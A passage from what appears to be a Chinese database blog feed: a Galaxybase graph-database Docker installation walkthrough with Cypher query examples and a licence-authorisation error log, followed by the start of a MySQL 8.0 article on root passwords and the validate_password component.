<li>docker 17+</li>
</ol>
<p>galaxybase可以在centos7进行安装，并需要安装docker17以上的版本。</p>
<h3 id="常用端口">常用端口</h3>
<ol>
<li>图集群管理端口： 51314</li>
<li>图可视化端口： 8888</li>
<li>图查询API端口： 7687</li>
</ol>
<h3 id="安装步骤">安装步骤</h3>
<ul>
<li>下载安装包</li>
</ul>
<p>从官网<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>下载最新单机版（<code>galaxybase-standalone-20220721170804.tar.gz</code>）。</p>
<ul>
<li>解压安装包</li>
</ul>
<p>将安装包上传至服务器并解压：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xf galaxybase-standalone-20220721170804.tar.gz</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">galaxybase-20220721170804  galaxybase-standalone-20220721170804.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">du</span> -sh galaxybase-20220721170804/</span></span><br><span class="line">601M    galaxybase-20220721170804/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree .</span></span><br><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── galaxybase-deploy</span><br><span class="line">│   ├── galaxybase-export</span><br><span class="line">│   └── galaxybase-load</span><br><span class="line">├── docker</span><br><span class="line">│   └── docker-linux.tgz</span><br><span class="line">└── images</span><br><span class="line">    └── images.wim</span><br><span class="line"></span><br><span class="line">3 directories, 5 files</span><br></pre></td></tr></table></figure></div>
<ul>
<li>环境变量</li>
</ul>
<p>添加环境变量：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.bashrc</span><br><span class="line">export GALAXYBASE_HOME=/data/gbca/galaxybase-20220721170804</span><br><span class="line">export PATH=$PATH:$GALAXYBASE_HOME/bin</span><br><span class="line"></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure></div>
<p>验证全局变量是否生效：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">galaxybase-deploy version</span></span><br><span class="line">Server: Galaxybase Engine - standalone</span><br><span class="line"> Version:   3.4.1</span><br><span class="line"> Build:     20220721170804</span><br><span class="line"> OS/Arch:   linux/amd64</span><br></pre></td></tr></table></figure></div>
<ul>
<li>安装镜像</li>
</ul>
<p>安装docker镜像</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">galaxybase-deploy image install</span><br></pre></td></tr></table></figure></div>
<p>安装成功：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">galaxybase-deploy image install</span></span><br><span class="line">2023/06/12 14:35:48 [INFO] check docker service state</span><br><span class="line">2023/06/12 14:35:48 [INFO] images load env check pass</span><br><span class="line">2023/06/12 14:35:48 [INFO] check original graph image</span><br><span class="line">2023/06/12 14:35:48 [INFO] start load graph image</span><br><span class="line">2023/06/12 14:36:13 [INFO] [local] [local] id : 05d30de7f8d8(7/7) [==================================================] 100.00%</span><br><span class="line">2023/06/12 14:36:13 [INFO] images is successfully loaded</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images</span></span><br><span class="line">REPOSITORY      TAG                IMAGE ID       CREATED         SIZE</span><br><span class="line">mariadb         10.11              9a79847e85fb   10 days ago     403MB</span><br><span class="line">mariadb         latest             9a79847e85fb   10 days ago     403MB</span><br><span class="line">mysql           8.0.32             412b8cc72e4a   2 months ago    531MB</span><br><span class="line">my-postgresql   15.2               42a9c74acef3   2 months ago    600MB</span><br><span class="line">amd64/busybox   latest             7cfbbec8963d   2 months ago    4.86MB</span><br><span class="line">busybox         latest             7cfbbec8963d   2 months ago    4.86MB</span><br><span class="line">mariadb         10.4               81825cbadf42   2 months ago    385MB</span><br><span class="line">mariadb         10.6               21277cbf6e2f   2 months ago    394MB</span><br><span class="line">galaxybase      s-20220721170804   f4ae486baad9   10 months ago   746MB</span><br></pre></td></tr></table></figure></div>
<p>使用sudo权限安装docker</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">galaxybase-deploy build graph --home /data/gbca/home-galaxybase</span><br></pre></td></tr></table></figure></div>
<p>安装成功：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">galaxybase-deploy build graph --home /data/gbca/home-galaxybase</span></span><br><span class="line">2023/06/12 14:37:02 [INFO] resolving a service instance</span><br><span class="line">2023/06/12 14:37:02 [INFO] check docker service state</span><br><span class="line">2023/06/12 14:37:02 [INFO] the service container is checked pass</span><br><span class="line">2023/06/12 14:37:02 [INFO] build resources</span><br><span class="line">2023/06/12 14:37:02 [INFO] start get cpu info</span><br><span class="line">2023/06/12 14:37:02 [INFO] build container running environment</span><br><span class="line">2023/06/12 14:37:02 [INFO] [graph] container created successfully</span><br><span class="line">2023/06/12 14:37:02 [INFO] starts [graph]-8d6140bedc59c14696c30c10c20b881c9e9f2e86e70bcf160f04f4b028018844 container</span><br><span class="line">2023/06/12 14:37:03 [INFO] [graph]-8d6140bedc59c14696c30c10c20b881c9e9f2e86e70bcf160f04f4b028018844 container started successfully</span><br><span class="line">2023/06/12 14:37:03 [INFO] waiting for server [server.manager.http] port [51314] listen</span><br><span class="line">2023/06/12 14:37:17 [INFO] the service container is successfully build</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                         COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class="line">8d6140bedc59   galaxybase:s-20220721170804   &quot;/usr/bin/runner-sta…&quot;   47 seconds ago   Up 46 seconds             galaxybase-dde2371d1f96</span><br></pre></td></tr></table></figure></div>
<p>查看服务启动日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker logs galaxybase-dde2371d1f96</span><br></pre></td></tr></table></figure></div>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-20d35175-7c35-4708-9da2-d04af6e4890a.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-45643559-3588-4d5a-b541-56b2069f1f55.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>启动服务</li>
</ul>
<p>启动 Galaxybase<br>
通过浏览器访问服务器的51314端口，进入图节点管理平台启动Galaxybase。<br>
账号/密码:admin/admin</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-b387137f-ba07-4631-b2c2-1c19210a7091.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-6a083991-6b2e-4e0e-8667-273d8bc344c6.png"
                      referrerpolicy="no-referrer"
                >
<ul>
<li>启动图节点</li>
</ul>
<p>启动图节点，会提示需要授权，可以联机，也可以手动申请。</p>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-631afb40-da75-4c77-82be-fb40b49165f4.png"
                      referrerpolicy="no-referrer"
                >
<p>通过授权后，可以启动节点。</p>
<img  alt="8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-05c60555-c2e9-43fd-b36a-a0c49dadf84c.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Cypher-语法">Cypher 语法</h2>
<h3 id="数据筛选">数据筛选</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (n:电影)</span><br><span class="line">WHERE n.上映年份 &gt; 1990</span><br><span class="line">RETURN n</span><br></pre></td></tr></table></figure></div>
<h3 id="模式匹配">模式匹配</h3>
<ul>
<li>用圆括号()表示点、用 --&gt; 表示边，可以用变量名指代点边数据</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p=()--&gt;() RETURN p LIMIT 10</span><br></pre></td></tr></table></figure></div>
<ul>
<li>边可以指明方向，也可以不指明方向</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (a)-[r]-(c) RERURN a,r,c LIMIT 10</span><br></pre></td></tr></table></figure></div>
<ul>
<li>在括号内可以添加具体信息</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (a)-[r:出演]-&gt;(b:电影 &#123;电影名: &quot;宝贝计划&quot;&#125;) RETURN a,r,b</span><br></pre></td></tr></table></figure></div>
<ul>
<li>可以设置路径长度</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p=(a:电影 &#123;电影名: &quot;宝贝计划&quot;&#125;)-[*3]-(c) RETURN p LIMIT 10</span><br></pre></td></tr></table></figure></div>
<h3 id="数据查询">数据查询</h3>
<ul>
<li>结果排序</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (b:电影)</span><br><span class="line">WHERE b.上映时间 &gt; 2000</span><br><span class="line">RETURN b ORDER BY b.上映时间 SKIP 10 LIMIT 1</span><br></pre></td></tr></table></figure></div>
<ul>
<li>路径查询</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p=(m:人物&#123;姓名:&quot;吴孟达&quot;&#125;)--()--(n:人物&#123;姓名:&quot;周星驰&quot;&#125;)</span><br><span class="line">RETURN p LIMIT 2</span><br></pre></td></tr></table></figure></div>
<ul>
<li>k跳扩展查询</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH p=(:人物&#123;姓名:&quot;刘德华&quot;&#125;)-[*1..2]-()</span><br><span class="line">RETURN p</span><br></pre></td></tr></table></figure></div>
<h3 id="数据修改">数据修改</h3>
<ul>
<li>修改属性</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (a:电影&#123;电影名:&quot;无间道&quot;&#125;)</span><br><span class="line">SET a.语言=&quot;粤语&quot;</span><br><span class="line">RETURN a</span><br></pre></td></tr></table></figure></div>
<ul>
<li>增加边、点</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE (a:人物&#123;姓名:&quot;AA&quot;&#125;) -[r:出演&#123;角色:&quot;RR&quot;&#125;]-&gt;(b:电影&#123;电影名:&quot;BB&quot;&#125;)</span><br><span class="line">RETURN a,r,b</span><br></pre></td></tr></table></figure></div>
<h3 id="数据删除">数据删除</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MATCH (a:人物&#123;姓名:&quot;特朗普&quot;&#125;)</span><br><span class="line">DELETE a</span><br></pre></td></tr></table></figure></div>
<h2 id="感谢-Carry-的帮助支持">感谢 Carry 的帮助支持</h2>
<p>在本文撰写过程中，启动单机版时遇到了授权失败的问题，感谢 @Carry 的帮助支持。</p>
<img  alt="9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230612-bb4ca468-dc7d-4238-b243-47b56524cfba.png"
                      referrerpolicy="no-referrer"
                >
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[13:53:27][OUT]进行自动授权,userLicense：xxx</span><br><span class="line">[13:53:49][OUT]send url: https://auth.galaxybase.cloud/galaxybase/galaxybase/authcode/verify 失败, AuthCode 验证失败，检查auth server是否正常!,Exception:</span><br><span class="line">[13:53:49][OUT]org.apache.http.conn.HttpHostConnectException: Connect to auth.galaxybase.cloud:443 [auth.galaxybase.cloud/42.194.233.160] failed: Connection refused (Connection refused)</span><br><span class="line">        at org.apache.http.impl.conn.DefaultHttpClientConnectionOperator.connect(DefaultHttpClientConnectionOperator.java:156)</span><br><span class="line">        at org.apache.http.impl.conn.PoolingHttpClientConnectionManager.connect(PoolingHttpClientConnectionManager.java:374)</span><br><span class="line">        at org.apache.http.impl.execchain.MainClientExec.establishRoute(MainClientExec.java:393)</span><br><span class="line">        at org.apache.http.impl.execchain.MainClientExec.execute(MainClientExec.java:236)</span><br><span class="line">        at org.apache.http.impl.execchain.ProtocolExec.execute(ProtocolExec.java:185)</span><br><span class="line">        at org.apache.http.impl.execchain.RetryExec.execute(RetryExec.java:89)</span><br><span class="line">        at org.apache.http.impl.execchain.RedirectExec.execute(RedirectExec.java:110)</span><br><span class="line">        at org.apache.http.impl.client.InternalHttpClient.doExecute(InternalHttpClient.java:185)</span><br><span class="line">        at org.apache.http.impl.client.CloseableHttpClient.execute(CloseableHttpClient.java:83)</span><br><span class="line">        at org.apache.http.impl.client.CloseableHttpClient.execute(CloseableHttpClient.java:108)</span><br><span class="line">        at com.galaxybase.admin.http.client.HttpClientUtil.postForObjectWithJson(HttpClientUtil.java:174)</span><br><span class="line">        at com.galaxybase.admin.service.AuthorizeService.sendAuthCode(AuthorizeService.java:250)</span><br><span class="line">        at com.galaxybase.admin.service.AuthorizeService.autoAuthorize(AuthorizeService.java:79)</span><br><span class="line">        at com.galaxybase.admin.http.servlet.AdminServlet.doPost(AdminServlet.java:122)</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:841)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1650)</span><br><span class="line">        at com.galaxybase.admin.http.filter.LoginFilter.doFilter(LoginFilter.java:203)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1637)</span><br><span class="line">        at org.eclipse.jetty.servlets.CrossOriginFilter.handle(CrossOriginFilter.java:308)</span><br><span class="line">        at org.eclipse.jetty.servlets.CrossOriginFilter.doFilter(CrossOriginFilter.java:262)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1637)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:533)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:188)</span><br><span class="line">        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1595)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:188)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1253)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:168)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:473)</span><br><span class="line">        at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1564)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:166)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1155)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)</span><br><span class="line">        at org.eclipse.jetty.server.handler.HandlerList.handle(HandlerList.java:61)</span><br><span class="line">        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)</span><br><span class="line">        at org.eclipse.jetty.server.Server.handle(Server.java:564)</span><br><span class="line">        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:317)</span><br><span class="line">        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)</span><br><span class="line">        at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)</span><br><span class="line">        at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:110)</span><br><span class="line">        at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)</span><br><span class="line">        at org.eclipse.jetty.util.thread.Invocable.invokePreferred(Invocable.java:128)</span><br><span class="line">        at org.eclipse.jetty.util.thread.Invocable$InvocableExecutor.invoke(Invocable.java:222)</span><br><span class="line">        at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:294)</span><br><span class="line">        at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)</span><br><span class="line">        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:672)</span><br><span class="line">        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:590)</span><br><span class="line">        at java.base/java.lang.Thread.run(Thread.java:829)</span><br><span class="line">Caused by: java.net.ConnectException: Connection refused (Connection refused)</span><br><span class="line">        at java.base/java.net.PlainSocketImpl.socketConnect(Native Method)</span><br><span class="line">        at java.base/java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:399)</span><br><span class="line">        at java.base/java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:242)</span><br><span class="line">        at java.base/java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:224)</span><br><span class="line">        at java.base/java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)</span><br><span class="line">        at java.base/java.net.Socket.connect(Socket.java:609)</span><br><span class="line">        at org.apache.http.conn.ssl.SSLConnectionSocketFactory.connectSocket(SSLConnectionSocketFactory.java:348)</span><br><span class="line">        at org.apache.http.impl.conn.DefaultHttpClientConnectionOperator.connect(DefaultHttpClientConnectionOperator.java:142)</span><br><span class="line">        ... 48 more</span><br><span class="line"></span><br><span class="line">[13:53:49][OUT]java.lang.RuntimeException: AuthCode 验证失败，检查auth service是否正常！</span><br><span class="line">        at com.galaxybase.admin.service.AuthorizeService.sendAuthCode(AuthorizeService.java:257)</span><br><span class="line">        at com.galaxybase.admin.service.AuthorizeService.autoAuthorize(AuthorizeService.java:79)</span><br><span class="line">        at com.galaxybase.admin.http.servlet.AdminServlet.doPost(AdminServlet.java:122)</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span><br><span class="line">        at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:841)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1650)</span><br><span class="line">        at com.galaxybase.admin.http.filter.LoginFilter.doFilter(LoginFilter.java:203)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1637)</span><br><span class="line">        at org.eclipse.jetty.servlets.CrossOriginFilter.handle(CrossOriginFilter.java:308)</span><br><span class="line">        at org.eclipse.jetty.servlets.CrossOriginFilter.doFilter(CrossOriginFilter.java:262)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1637)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:533)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:188)</span><br><span class="line">        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1595)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:188)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1253)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:168)</span><br><span class="line">        at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:473)</span><br><span class="line">        at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1564)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:166)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1155)</span><br><span class="line">        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)</span><br><span class="line">        at org.eclipse.jetty.server.handler.HandlerList.handle(HandlerList.java:61)</span><br><span class="line">        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)</span><br><span class="line">        at org.eclipse.jetty.server.Server.handle(Server.java:564)</span><br><span class="line">        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:317)</span><br><span class="line">        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)</span><br><span class="line">        at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)</span><br><span class="line">        at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:110)</span><br><span class="line">        at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)</span><br><span class="line">        at org.eclipse.jetty.util.thread.Invocable.invokePreferred(Invocable.java:128)</span><br><span class="line">        at org.eclipse.jetty.util.thread.Invocable$InvocableExecutor.invoke(Invocable.java:222)</span><br><span class="line">        at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:294)</span><br><span class="line">        at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:199)</span><br><span class="line">        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:672)</span><br><span class="line">        at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:590)</span><br><span class="line">        at java.base/java.lang.Thread.run(Thread.java:829)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>本文介绍了 GBCA 考试相关内容，并记录了如何在本地安装 galaxybase 单机版，以及基础的语法示例。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/645884" >https://www.modb.pro/db/645884 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.galaxybase.com/download" >https://www.galaxybase.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>Galaxybase</category>
      </categories>
      <tags>
        <tag>国产数据库认证</tag>
        <tag>galaxybase</tag>
        <tag>创邻科技</tag>
        <tag>图数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 管理运维：root 密码还可以这样改</title>
    <url>/2023/mysql/mysql-8-component_validate_password/</url>
    <content><![CDATA[<p>在 MySQL 的管理和运维过程中，修改 root 用户的密码是一个常见的操作。</p>
<p>通常情况下，我们使用 MySQL 自带的命令来修改 root 用户的密码，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: 旧密码</span><br><span class="line">mysql&gt; set password = &#x27;新密码&#x27;;</span><br></pre></td></tr></table></figure></div>
<p>不过，为了确保用户安全，尤其是 root 用户密码的健壮性，MySQL 服务器默认启用了密码校验组件。</p>
<h2 id="validate-password-组件">validate_password 组件</h2>
<p>是的，这里的表述是“组件”，不再是“插件”。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ll *valid*</span><br><span class="line">-rwxr-xr-x 1 root root 50136 Mar 17  2023 component_validate_password.so</span><br><span class="line">-rwxr-xr-x 1 root root 33896 Mar 17  2023 validate_password.so</span><br></pre></td></tr></table></figure></div>
<p>从 MySQL 8.0 开始，MySQL Server 引入了基于组件的基础架构，用于提高服务器的可扩展性。</p>
<p>在服务器的插件目录下，可以看到下列组件包：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 plugin]# pwd</span><br><span class="line">/usr/lib64/mysql/plugin</span><br><span class="line">[root@rocky9 plugin]# ls component_*</span><br><span class="line">component_audit_api_message_emit.so</span><br><span class="line">component_example_component1.so</span><br><span class="line">component_example_component2.so</span><br><span class="line">component_example_component3.so</span><br><span class="line">component_keyring_file.so</span><br><span class="line">component_log_filter_dragnet.so</span><br><span class="line">component_log_sink_json.so</span><br><span class="line">component_log_sink_syseventlog.so</span><br><span class="line">component_log_sink_test.so</span><br><span class="line">component_mysqlbackup.so</span><br><span class="line">component_mysqlx_global_reset.so</span><br><span class="line">component_pfs_example_component_population.so</span><br><span class="line">component_pfs_example.so</span><br><span class="line">component_query_attributes.so</span><br><span class="line">component_reference_cache.so</span><br><span class="line">component_test_audit_api_message.so</span><br><span class="line">component_test_backup_lock_service.so</span><br><span class="line">component_test_component_deinit.so</span><br><span class="line">component_test_host_application_signal.so</span><br><span class="line">component_test_mysql_command_services.so</span><br><span class="line">component_test_mysql_current_thread_reader.so</span><br><span class="line">component_test_mysql_runtime_error.so</span><br><span class="line">component_test_mysql_system_variable_set.so</span><br><span class="line">component_test_mysql_thd_store_service.so</span><br><span class="line">component_test_pfs_notification.so</span><br><span class="line">component_test_pfs_resource_group.so</span><br><span class="line">component_test_sensitive_system_variables.so</span><br><span class="line">component_test_server_telemetry_traces.so</span><br><span class="line">component_test_status_var_reader.so</span><br><span class="line">component_test_status_var_service_int.so</span><br><span class="line">component_test_status_var_service_reg_only.so</span><br><span class="line">component_test_status_var_service.so</span><br><span class="line">component_test_status_var_service_str.so</span><br><span class="line">component_test_status_var_service_unreg_only.so</span><br><span class="line">component_test_string_service_charset.so</span><br><span class="line">component_test_string_service_long.so</span><br><span class="line">component_test_string_service.so</span><br><span class="line">component_test_system_variable_source.so</span><br><span class="line">component_test_sys_var_service_int.so</span><br><span class="line">component_test_sys_var_service_same.so</span><br><span class="line">component_test_sys_var_service.so</span><br><span class="line">component_test_sys_var_service_str.so</span><br><span class="line">component_test_table_access.so</span><br><span class="line">component_test_udf_registration.so</span><br><span class="line">component_test_udf_services.so</span><br><span class="line">component_udf_reg_3_func.so</span><br><span class="line">component_udf_reg_avg_func.so</span><br><span class="line">component_udf_reg_int_func.so</span><br><span class="line">component_udf_reg_int_same_func.so</span><br><span class="line">component_udf_reg_only_3_func.so</span><br><span class="line">component_udf_reg_real_func.so</span><br><span class="line">component_udf_unreg_3_func.so</span><br><span class="line">component_udf_unreg_int_func.so</span><br><span class="line">component_udf_unreg_real_func.so</span><br><span class="line">component_validate_password.so</span><br><span class="line">[root@rocky9 plugin]# </span><br></pre></td></tr></table></figure></div>
<p>值得注意的是，在 MySQL 8.0 中，validate_password 插件被重新实现为 validate_password 组件。 validate_password 插件已弃用；预计它会在 MySQL 的未来版本中被删除。</p>
<p>相关参数更名为以 <code>validate_password.*</code> 前缀。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [(none)]&gt; show variables like &#x27;validate_password%&#x27;;</span><br><span class="line">+--------------------------------------+--------+</span><br><span class="line">| Variable_name                        | Value  |</span><br><span class="line">+--------------------------------------+--------+</span><br><span class="line">| validate_password.check_user_name    | ON     |</span><br><span class="line">| validate_password.dictionary_file    |        |</span><br><span class="line">| validate_password.length             | 8      |</span><br><span class="line">| validate_password.mixed_case_count   | 1      |</span><br><span class="line">| validate_password.number_count       | 1      |</span><br><span class="line">| validate_password.policy             | MEDIUM |</span><br><span class="line">| validate_password.special_char_count | 1      |</span><br><span class="line">+--------------------------------------+--------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>基于上述参数，我们在修改用户密码时需要注意密码的健壮性，可以通过下面这个函数来检查。</p>
